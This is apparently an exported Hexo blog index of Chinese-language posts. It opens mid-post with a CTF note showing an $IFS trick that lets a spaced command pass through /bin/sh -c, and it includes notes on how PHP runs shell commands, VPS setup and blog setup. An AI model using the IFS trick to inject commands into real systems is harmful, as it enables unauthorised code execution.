bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$test</span>=<span class="built_in">echo</span>\ <span class="built_in">test</span></span><br><span class="line">/bin/sh -c <span class="variable">$test</span>    <span class="comment"># 无法正常运行</span></span><br><span class="line"><span class="variable">$IFS</span>= <span class="comment"># 这里是空格</span></span><br><span class="line">/bin/sh -c <span class="variable">$test</span>    <span class="comment"># 可以正常运行，输出test</span></span><br></pre></td></tr></table></figure></li></ol></li></ol><h3 id="在bash-POSIX-shell中忘记引用变量的安全性影响"><a href="#在bash-POSIX-shell中忘记引用变量的安全性影响" class="headerlink" title="***在bash&#x2F;POSIX shell中忘记引用变量的安全性影响"></a>***在bash&#x2F;POSIX shell中忘记引用变量的安全性影响</h3><ol><li>Stack Exchange高关注议题<a href="https://unix.stackexchange.com/questions/171346/security-implications-of-forgetting-to-quote-a-variable-in-bash-posix-shells">Security implications of forgetting to quote a variable in bash&#x2F;POSIX shells</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> rce </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>语言自学指南(2024持续更新)</title>
      <link href="/2024/10/26/%E8%AF%AD%E8%A8%80%E8%87%AA%E5%AD%A6%E6%8C%87%E5%8D%97/"/>
      <url>/2024/10/26/%E8%AF%AD%E8%A8%80%E8%87%AA%E5%AD%A6%E6%8C%87%E5%8D%97/</url>
      
        <content type="html"><![CDATA[<blockquote><p>中国油锯古瓦，自学才是效率最高的学习  </p><hr><ol><li>这里总结一下我搜集的各种资源(无视频)，其中有些也没看完&#x2F;只是浅浅过一遍  </li><li>同时，语言是不断发展的，这是2024年搜集到的(并不是2024年的)<br>总而言之：翻到这篇资源的伙伴请睁大你的眼睛</li></ol></blockquote><h2 id="Bash"><a href="#Bash" class="headerlink" title="Bash"></a>Bash</h2><ol><li><a href="https://www.gnu.org/software/bash/manual/bash.html">gnu bash 2022官方</a></li><li><a href="https://www.ruanyifeng.com/blog/2020/04/bash-tutorial.html">阮一峰</a></li><li><a href="https://tldp.org/LDP/abs/html/">Advanced Bash-Scripting Guide en</a></li><li><a href="https://www.shellscript.sh/">shell script</a></li><li><a href="https://www.shellscript.sh/">命令行的艺术</a></li></ol><h2 id="JavaScript"><a href="#JavaScript" class="headerlink" title="JavaScript"></a>JavaScript</h2><ol><li><a href="https://zh.javascript.info/">js现代教程 真神</a></li><li><a href="https://nodejs.org/en/learn/getting-started/introduction-to-nodejs">node.js</a></li><li><a href="https://expressjs.com/">express.js</a></li><li><a href="https://vuejs.org/guide/introduction.html">vue3 有中文版</a></li></ol>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>php命令执行底层原理的小记</title>
      <link href="/2024/10/26/php%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%BA%95%E5%B1%82%E5%8E%9F%E7%90%86%E7%9A%84%E5%B0%8F%E8%AE%B0/"/>
      <url>/2024/10/26/php%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%BA%95%E5%B1%82%E5%8E%9F%E7%90%86%E7%9A%84%E5%B0%8F%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<blockquote><p>起源来自hitcon 2017 babyfirst-revenge和babyfirst-revengev2中关于转义\处理的问题，折腾我一个晚上(生气) -&gt; 最后感谢v1nd大哥</p></blockquote><h2 id="Ref"><a href="#Ref" class="headerlink" title="Ref"></a>Ref</h2><ol><li>php命令执行底层原理<ol><li><a href="https://qftm.github.io/2020/12/01/command-execution-research-php/">其实看这篇就好了，只是自己总结一下，没有太考虑阅读感受(比较精简)</a></li><li><a href="https://xz.aliyun.com/t/6542?time__1311=n4+xnD0Dg7G=74xBkbDyDmrEDuGDBlOcGOYrYD">命令执行成因小注</a></li><li><a href="https://zhuanlan.zhihu.com/p/339071601">知乎安全客，像是第一篇的转载</a></li></ol></li></ol><h2 id="Linux下的命令执行"><a href="#Linux下的命令执行" class="headerlink" title="Linux下的命令执行"></a>Linux下的命令执行</h2><ol><li>分为自身终端封装的指令(内置)和终端下调用其它目录下的可执行程序(外部)共两种<ol><li>通过<code>type echo</code>和<code>which whoami</code>可以知道，可以通过<code>enable</code>和<code>help</code>来查看内建指令<ol><li>其中<code>/bin</code>是一个指向<code>/usr/bin</code>的链接文件噢</li></ol></li><li><em><strong>Difference</strong></em><ol><li>shell会查找command是否为built-in command类型，对于built-in command指令类型，shell会自己解释执行，而无需fork一个child process子进程来执行该command指令；</li><li>对于，不是built-in command指令类型，shell会从环境变量中按顺序搜索该command指令，如果能查到则会fork一个child process子进程来执行该command指令；然而，对于找不到的command指令，一般为：执行的指令不存在、指令未加入到环境变量中</li></ol></li></ol></li></ol><h2 id="Windows下的命令执行"><a href="#Windows下的命令执行" class="headerlink" title="Windows下的命令执行"></a>Windows下的命令执行</h2><ol><li>同linux一样，分为自身终端封装的指令(内置)和终端下调用其它目录下的可执行程序(外部)共两种<ol><li>使用<code>where cd</code>或者<code>set path=</code>后使得path&#x3D;(null)来调用命令共两种方法可以进行区分<ol><li>where中显示找不到但是可以执行的命令为内建命令，找得到的都是非内建的</li><li><code>set path=</code>后可以执行的为内建命令，不可以执行的是外部命令</li><li>无法使用<code>help</code>命令(本生是外键)，会把所有内+外都列出来</li></ol></li></ol></li><li>差异也是会不会开子进程的情况</li></ol><h2 id="Sytem-Execution-Func-in-different-lang"><a href="#Sytem-Execution-Func-in-different-lang" class="headerlink" title="Sytem Execution Func in different lang"></a>Sytem Execution Func in different lang</h2><blockquote><p>命令执行函数执行分为两类，一类：传入的命令仅仅作为可执行终端中的命令执行；另一类：传入的命令仅仅是运行传入的命令中的可执行程序。对象不同，一类：是底层语言系统终端帮我们执行传入的命令；另一类：是自己启动传入的可执行程序。</p></blockquote><h3 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PHP - 底层调用系统终端，执行命令     Mode =&gt; Window：cmd.exe /c Command || Linux：sh -c Command</span><br></pre></td></tr></table></figure><ol><li>linux和windows都有追踪<em><strong>程序流的工具</strong></em><ol><li>linux: strace</li><li>windows: OD动态调试，微软官方提供的Process Explorer工具进行跟踪分析</li></ol></li><li>命令执行函数在bash中调用的命令是<code>/bin/sh -c &quot;...&quot;</code><ol><li>这里单引号和双引号一样，都可以变量替换 -&gt; <code>/bin/sh -c &#39;echo $SHELL&#39;</code>也可以正确输出</li></ol></li><li>在<code>system</code>的实验下都只是调用了一个子进程<code>/bin/sh</code></li><li>Shell 执行：PHP 中的shell_exec 、 exec和system等函数调用系统的 shell（通常为&#x2F;bin&#x2F;sh或&#x2F;bin&#x2F;bash ）来执行命令。这意味着他们启动一个新的 shell 进程来解释您提供的命令字符串</li></ol><h3 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 与php不同的模型</span></span><br><span class="line">Java - 底层不调用系统终端，自己启动传入的可执行程序    Mode =&gt; Window：Command || Linux：Command</span><br></pre></td></tr></table></figure><ol><li>在Java语言里面，针对Linux平台，系统命令<code>echo 111 &gt; shell.txt</code>传入CommandExecFunc函数，最终在底层相当于执行<code>/bin/echo 111 &gt; shell.txt</code><ol><li>这里的echo作为可执行程序出现，而不是终端中的命令，没有整体再次进行解释</li></ol></li><li>window中也一样</li><li>无 Shell 开销：由于 Java 默认情况下不通过 shell，因此您可以更直接地控制命令的执行，但这也意味着您可能需要自己处理环境变量、命令行解析和输出重定向（如果需要）</li></ol><h3 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 和php一样</span></span><br><span class="line">Python - 底层调用系统终端，执行命令     Mode =&gt; Window：cmd.exe /c Command || Linux：sh -c Command</span><br></pre></td></tr></table></figure><h2 id="Dive-into-PHP"><a href="#Dive-into-PHP" class="headerlink" title="Dive into PHP"></a>Dive into PHP</h2><blockquote><p>重点关注: system, exec, shell_exec, passthru 四个函数</p></blockquote><ol><li><p>这一部分就详见qftm的文章吧，写的很好，我来小小<em><strong>总结</strong></em></p><ol><li><p>linux中system、exec、passthru、shell_exec这类命令执行函数底层在linux中都是调用<code>/bin/sh -c &#39;...&#39;</code>这样的，是通过源码看出来的 –&gt; 这里的&#x2F;bin&#x2F;sh在不同平台中所指向的链接不同，debian系默认&#x2F;bin&#x2F;sh指向&#x2F;bin&#x2F;dash；redhat系默认&#x2F;bin&#x2F;sh指向&#x2F;bin&#x2F;bash</p><blockquote><p>最初，bash是GNU&#x2F;Linux 操作系统中 &#x2F;bin&#x2F;sh 的符号链接，但由于bash过于复杂，有人把 bash 从 NetBSD 移植到 Linux 并更名为 dash，且&#x2F;bin&#x2F;sh符号连接到dash。Dash Shell 比 Bash Shell 小的多（ubuntu16.04上，bash大概1M，dash只有150K），符合POSIX标准。Ubuntu 6.10开始默认是Dash。</p></blockquote></li><li><p>windows中都是cmd.exe</p></li><li><p><em><strong>QUICK判断</strong></em>: 如果单纯的是想知道某个命令执行函数是否调用cmd.exe终端去执行系统指令的话，可以在php脚本里面写一个循环，然后观察进程创建情况即可：简单、粗暴</p></li></ol></li><li><p>关于exec()</p><ol><li>在官方手册的评论中有这样一句话，很是受益，平时找的时候可以关注一下评论<a href="https://www.php.net/function.exec">111</a></li></ol> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">In Windows, <span class="built_in">exec</span>() issues an internal call to <span class="string">&quot;cmd /c your_command&quot;</span>. This implies that your <span class="built_in">command</span> must follow the rules imposed by cmd.exe <span class="built_in">which</span> includes an extra <span class="built_in">set</span> of quotes around the full <span class="built_in">command</span>:</span><br><span class="line"></span><br><span class="line">- http://ss64.com/nt/cmd.html</span><br><span class="line"></span><br><span class="line">Current PHP versions take this into account and add the quotes automatically, but old versions didn<span class="string">&#x27;t.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Apparently, the change was made in PHP/5.3.0 yet not backported to 5.2.x because it&#x27;</span>s a backwards incompatible change. To <span class="built_in">sum</span> up:</span><br><span class="line"></span><br><span class="line">- In PHP/5.2 and older you have to surround the full <span class="built_in">command</span> plus arguments <span class="keyword">in</span> double quotes</span><br><span class="line">- In PHP/5.3 and greater you don<span class="string">&#x27;t have to (if you do, your script will break)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">If you are interested in the internals, this is the source code:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">sprintf(cmd, &quot;%s /c \&quot;%s\&quot;&quot;, TWG(comspec), command); </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">It can be found at http://svn.php.net/viewvc/ (please find php/php-src/trunk/TSRM/tsrm_win32.c, the comment system doesn&#x27;</span>t allow the direct <span class="built_in">link</span>).</span><br></pre></td></tr></table></figure></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> rce </tag>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctf3r的第一台vps(2024)</title>
      <link href="/2024/10/25/ctf3r%E7%9A%84%E7%AC%AC%E4%B8%80%E5%8F%B0vps/"/>
      <url>/2024/10/25/ctf3r%E7%9A%84%E7%AC%AC%E4%B8%80%E5%8F%B0vps/</url>
      
        <content type="html"><![CDATA[<blockquote><p>给曾经一窍不通的自己的总结，其实看官方文档就ok了，这一篇做一个记录，后面忘记了也可以quick start</p></blockquote><h2 id="1-购买服务器"><a href="#1-购买服务器" class="headerlink" title="1. 购买服务器"></a>1. 购买服务器</h2><ol><li>建议<ol><li>看看优惠页面，直接搜索即可</li><li>看看试用</li><li>如果是学生的话搜索时添加个学生就够了</li><li>入门的话感觉瞄准阿里云(免费额度也够)就好了，不用太在不同平台间挣扎浪费时间</li></ol></li><li>我现在暂时用的是阿里云的服务器试用，美味的白嫖<ol><li>注意自己注意时间，给的是要3个月内使用的300元体验</li><li>一个月检查一次吧</li></ol></li></ol><h2 id="2-配置-vscode"><a href="#2-配置-vscode" class="headerlink" title="2. 配置 + vscode"></a>2. 配置 + vscode</h2><ol><li><a href="https://help.aliyun.com/zh/ecs/getting-started/getting-started?spm=a2c4g.11186623.0.0.4802629cDcbhgp">看看官方入门文档</a></li><li>安全组设置<ol><li>点击快速配置中有http, https, ssh, rdp就够了，配置后记得切换使用这个的</li></ol></li><li>配置一下密钥对<ol><li>有一些没有可以选择root或者ecs-user的机型可能会有出现无法登录root的情况 –&gt; <a href="https://help.aliyun.com/zh/ecs/use-cases/log-on-to-a-linux-instance-by-using-an-ssh-key-pair-as-a-regular-user">看看这篇</a></li><li>还要给自己的新用户增加sudo用户组后续方便操作，阿里云自己的操作系统是centos系的，查看组<code>cat /etc/group</code>，<code>usermod -aG wheel username</code>后<code>groups username</code>一下</li></ol></li><li>接着就直接在vscode中搞一下<ol><li>连接配置<ol><li>wsl无法再连向远程了，cs144是因为再容器中；需要再windows中设置</li></ol></li><li>文件传输配置(local-&gt;remote) –&gt; 无法remote-&gt;local, 否则我就不用来开vps了<ol><li>在windows中使用的，可以直接cv</li><li>也可以考虑wsl文件先放到Win中，然后win中在终端传到云服务器上<ol><li>wsl中设置环境变量<code>YUN</code>方便将文件传入到windows中<code>cp my_file $YUN</code>，windows中可以直接使用<code>toYUN</code>别名切换到$YUN文件夹中来传文件(我用到bash)</li><li>在windows中使用<code>toh3110w0r1d</code>来开启sftp服务(<strong>文件相对路径默认传输到<code>/home/user/</code>文件夹下</strong>)，使用<code>bye</code>或者<code>exit</code>来退出</li><li>可以使用<code>ls</code>, <code>cd</code>, <code>pwd</code>, <code>rm</code>, <code>mkdir</code>, <code>rmdir</code>来管理<ol><li><code>get -r remote_file remote_dir</code></li><li><code>put -r local_file remote_dir</code></li></ol></li></ol></li></ol></li></ol></li></ol><h2 id="3-搭建网页"><a href="#3-搭建网页" class="headerlink" title="3. 搭建网页"></a>3. 搭建网页</h2><ol><li><a href="https://help.aliyun.com/zh/ecs/use-cases/summary-of-website-building-methods?spm=a2c4g.11186623.0.0.66c840f10Z91oO#p-43l-u9m-c5v">阿里云教程</a></li><li>搭建node.js环境，有教程，直接看就好</li><li>搞一个路由文件就OK了，方便进行文件包含和访问</li></ol><h2 id="4-域名设置"><a href="#4-域名设置" class="headerlink" title="4. 域名设置"></a>4. 域名设置</h2><ol><li>我搞的是github学生包里的namecheap中的免费一年的.me域名，折腾一下就好了</li><li><a href="https://zhuanlan.zhihu.com/p/634806678">参考文章链接</a><ol><li>注意要从github活动页进去才可以</li></ol></li><li>最后在wsl(我的话)使用<code>nslookup</code>来查询域名即可</li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctfenv </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>利用hexo和github搭建个人独立博客</title>
      <link href="/2023/12/05/%E5%88%A9%E7%94%A8hexo%E5%92%8Cgithub%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E7%8B%AC%E7%AB%8B%E5%8D%9A%E5%AE%A2/"/>
      <url>/2023/12/05/%E5%88%A9%E7%94%A8hexo%E5%92%8Cgithub%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E7%8B%AC%E7%AB%8B%E5%8D%9A%E5%AE%A2/</url>
      
        <content type="html"><![CDATA[<h2 id="1-前置工具-环境"><a href="#1-前置工具-环境" class="headerlink" title="1. 前置工具&amp;&amp;环境"></a>1. 前置工具&amp;&amp;环境</h2><ol><li>github</li><li>Node.js</li><li>hexo</li><li>git</li></ol><h2 id="2-下载node-js和git"><a href="#2-下载node-js和git" class="headerlink" title="2. 下载node.js和git"></a>2. 下载node.js和git</h2><ol><li><a href="https://git-scm.com/">Git官网</a><ol><li>点击download下载即可，一路next没啥问题<br> <img src="/pic/%E5%88%A9%E7%94%A8hexo%E5%92%8Cgithub%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E7%8B%AC%E7%AB%8B%E5%8D%9A%E5%AE%A2/%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2Z1.png" alt="Git Download"></li></ol></li><li><a href="https://nodejs.cn/">node.js官网</a><ol><li>Hexo是基于 Node.js 驱动的一款博客框架</li><li>也是直接点击download即可<br> <img src="/pic/%E5%88%A9%E7%94%A8hexo%E5%92%8Cgithub%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E7%8B%AC%E7%AB%8B%E5%8D%9A%E5%AE%A2/%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2Z2.png" alt="node.js Download"></li></ol></li><li>以上两个下载完成后再cmd控制台中输入以下，有出现版本号即可<ol><li>node -v</li><li>npm -v</li><li>git -v<br> <img src="/pic/%E5%88%A9%E7%94%A8hexo%E5%92%8Cgithub%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E7%8B%AC%E7%AB%8B%E5%8D%9A%E5%AE%A2/%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2Z3.png" alt="CMD显示"></li></ol></li></ol><h2 id="3-安装hexo"><a href="#3-安装hexo" class="headerlink" title="3. 安装hexo"></a>3. 安装hexo</h2><ol><li>在自己的目录中新建一个文件夹来存放你的博客文章<br> <img src="/pic/%E5%88%A9%E7%94%A8hexo%E5%92%8Cgithub%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E7%8B%AC%E7%AB%8B%E5%8D%9A%E5%AE%A2/%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A24.png" alt="hexo目录建立"></li><li>进入文件夹中，右键选择”显示更多选项”，点击git bash<ol><li>跟换淘宝源(下载更快一点)，使用命令行<code>npm install -g cnpm --registry=https:\//registry.npm.taobao.org</code><br> <img src="/pic/%E5%88%A9%E7%94%A8hexo%E5%92%8Cgithub%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E7%8B%AC%E7%AB%8B%E5%8D%9A%E5%AE%A2/%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A25.png" alt="淘宝源"></li><li>下载hexo，使用命令<code>cnpm install -g hexo-cli</code></li><li>进行初始化，使用命令<code>hexo init</code>，并且文件夹中多出一堆文章(发现自己少了什么也没事，下图是写博客时照的，init成功一般就好了)<br> <img src="/pic/%E5%88%A9%E7%94%A8hexo%E5%92%8Cgithub%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E7%8B%AC%E7%AB%8B%E5%8D%9A%E5%AE%A2/%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A26.png" alt="hexo init"><br> <img src="/pic/%E5%88%A9%E7%94%A8hexo%E5%92%8Cgithub%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E7%8B%AC%E7%AB%8B%E5%8D%9A%E5%AE%A2/%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A27.png" alt="hexo init"></li><li>在git bash中输入<code>hexo s</code>或者<code>hexo server</code>(二者一样)，有hello world界面就好了(这个界面是自带的)，出现这个界面也就成功了，hexo安装正常完毕<br> <img src="/pic/%E5%88%A9%E7%94%A8hexo%E5%92%8Cgithub%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E7%8B%AC%E7%AB%8B%E5%8D%9A%E5%AE%A2/%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A28.png" alt="hexo s"></li></ol></li></ol><h2 id="4-注册github并创建库"><a href="#4-注册github并创建库" class="headerlink" title="4. 注册github并创建库"></a>4. 注册github并创建库</h2><ol><li><a href="https://github.com/">github网站</a><ol><li>需要魔法(可以直接用steam++加速github单个，现在改名叫<a href="https://steampp.net/">Watt Tookie</a>)</li><li>如果是未使用过的用户需要先注册，<em><strong>sign up</strong></em>按要求走就可以了</li><li>注册之后邮箱会收到一封Github的邮件，点击Github的链接确认注册即可<br>  <img src="/pic/%E5%88%A9%E7%94%A8hexo%E5%92%8Cgithub%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E7%8B%AC%E7%AB%8B%E5%8D%9A%E5%AE%A2/%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A29.png" alt="注册图片"></li></ol></li><li>注册完毕后，创建一个仓库<ol><li>点击右上角个人头像，点击其中的Your repositories<br>  <img src="/pic/%E5%88%A9%E7%94%A8hexo%E5%92%8Cgithub%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E7%8B%AC%E7%AB%8B%E5%8D%9A%E5%AE%A2/%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A210.png" alt="创建仓库"></li><li>点击右上角绿色的new按钮，输入仓库名，选择public类型，其他不用去改动它<ol><li>注意此处的仓库名一定要是<em><strong>用户名.github.io</strong></em>，否则会打不开网页<br>  <img src="/pic/%E5%88%A9%E7%94%A8hexo%E5%92%8Cgithub%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E7%8B%AC%E7%AB%8B%E5%8D%9A%E5%AE%A2/%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A211.png" alt="初始化仓库"></li></ol></li><li>复制下ssh，下面要用<br>  <img src="/pic/%E5%88%A9%E7%94%A8hexo%E5%92%8Cgithub%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E7%8B%AC%E7%AB%8B%E5%8D%9A%E5%AE%A2/%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A212.png" alt="ssh"></li></ol></li></ol><h2 id="5-设置ssh密钥"><a href="#5-设置ssh密钥" class="headerlink" title="5. 设置ssh密钥"></a>5. 设置ssh密钥</h2><ol><li>首先生成ssh公钥<ol><li>在git bash下输入<code>cd ~/.ssh</code>进入ssh文件</li><li>在git bash中的ssh文件中输入命令<code>ssh-keygen -t rsa -C 注册时的邮箱地址</code></li></ol></li><li>配置ssh到github中<ol><li>在我的电脑中打开<em><strong>C盘</strong></em>找到 <em><strong>用户</strong></em>，进入发现有一个.ssh的文件夹</li><li>点击进去看见<br>  <img src="/pic/%E5%88%A9%E7%94%A8hexo%E5%92%8Cgithub%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E7%8B%AC%E7%AB%8B%E5%8D%9A%E5%AE%A2/%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A213.png" alt="ssh"></li><li>接下来要点开<em><strong>id_rsa.pub文件，不能是id_rsa文件</strong></em>(如果点击会改变，需要重开)，<em><strong>从头到尾复制下来</strong></em>(ssh-rsa 也要)</li><li>回到github同样点击右上角头像，找到setting按键, 将刚刚在.ssh目录下所复制的id_rsa.put文件中的信息复制进key,名字的话随便取都可以<br>  <img src="/pic/%E5%88%A9%E7%94%A8hexo%E5%92%8Cgithub%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E7%8B%AC%E7%AB%8B%E5%8D%9A%E5%AE%A2/%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A214.png" alt="ssh"><br>  <img src="/pic/%E5%88%A9%E7%94%A8hexo%E5%92%8Cgithub%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E7%8B%AC%E7%AB%8B%E5%8D%9A%E5%AE%A2/%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A215.png" alt="ssh"></li><li>验证是否添加成功，输入命令<code>ssh -T git@github.com</code>并且输入yes之后，行末尾会显示你的用户名，同时会有邮箱提醒</li></ol></li><li>最后对本地的git进行全局配置<ol><li>输入命令：<code>git config --global user.name &quot;注册时用户名&quot;</code></li><li>输入命令：<code>git config --global user.email &quot;注册时邮箱&quot;</code></li></ol></li></ol><h2 id="6-撰写文章并发布"><a href="#6-撰写文章并发布" class="headerlink" title="6. 撰写文章并发布"></a>6. 撰写文章并发布</h2><ol><li><p>先打开目录下的_config.yml文件</p><ol><li><p>ctrl+f搜索关键字deploy</p></li><li><p>将deploy部分替换为</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">deploy:  </span><br><span class="line">   type: git  </span><br><span class="line">   repo: git@github.com:用户名/用户名.github.io.git    #这个是使用ssh的格式，注释可以不用加入</span><br><span class="line">   branch: main</span><br></pre></td></tr></table></figure></li></ol></li><li><p>需要安装上传工具</p><ol><li>在gitbash中输入命令 <em><strong>cnpm install hexo-deployer-git</strong></em></li><li>需要在文件的根目录下运行命令</li></ol></li><li><p>在hexo中创建文章(md格式)</p><ol><li>在hexo中写博客是要浅学以下markdown的喔，一天基本就能学会了</li><li>写markdown的文章我是直接使用vscode，网上教程看一下就好</li><li>使用hexo new命令创建新文章<ol><li>在哪里使用该命令都可以，会自动在soure中的_posts文件夹下产生md文件(也可以直接_posts文件夹中右键创建)<br>  <img src="/pic/%E5%88%A9%E7%94%A8hexo%E5%92%8Cgithub%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E7%8B%AC%E7%AB%8B%E5%8D%9A%E5%AE%A2/%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A216.png" alt="hexo new"></li></ol></li></ol></li><li><p>进行文章编写后预览</p><ol><li>vscode中文章编写完成后ctrl+s保存</li><li>在git bash中输入命令(在哪都可以)<code>hexo s</code>或者<code>hexo server</code>(上文有提到过)</li><li>会返回一个本机网址，进入网址即可看到自己的博客界面(默认主题未上传)</li></ol></li><li><p>将文章上传至github上</p><ol><li>输入命令<code>hexo g</code>先生成静态文件再<code>hexo d</code>部署到github上</li><li>再次访问个人网站即会出现你所作的更改啦(有时要等一会儿，不会马上就改变)</li></ol></li></ol><h2 id="7-结语"><a href="#7-结语" class="headerlink" title="7. 结语"></a>7. 结语</h2><p>到这里hexo+github搭建个人博客就已经完成了，开始记录从0到1的成长之路吧！！！</p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
